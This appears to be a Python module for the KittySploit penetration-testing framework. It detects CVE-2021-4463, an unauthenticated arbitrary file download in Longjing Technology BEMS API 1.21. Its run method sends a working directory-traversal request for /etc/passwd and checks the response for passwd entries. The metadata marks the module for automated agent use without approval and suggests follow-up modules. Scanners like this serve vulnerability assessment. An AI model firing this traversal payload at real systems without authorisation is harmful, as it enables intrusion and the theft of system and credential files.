#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Longjing Technology BEMS API 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Longjing Technology BEMS API 1.21 - Unauthenticated Arbitrary File Download Detection',
        'description': 'Longjing Technology BEMS API 1.21 is vulnerable to local file inclusion. Input passed through the fileName parameter through the downloads API endpoint is not properly verified before being used to download files. This can be exploited to disclose the contents of arbitrary and sensitive files through directory traversal attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5657.php',
            'https://packetstormsecurity.com/files/163702/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-4463',
            'https://www.cve.org/CVERecord?id=CVE-2021-4463',
            'https://www.exploit-db.com/exploits/50163',
        ],
        'cve': 'CVE-2021-4463',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/downloads?fileName=../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Longjing Technology BEMS API 1.21 - Unauthenticated Arbitrary File Download detected",
                path='/api/downloads?fileName=../../../../../../../../etc/passwd',
            )
            return True
        return False

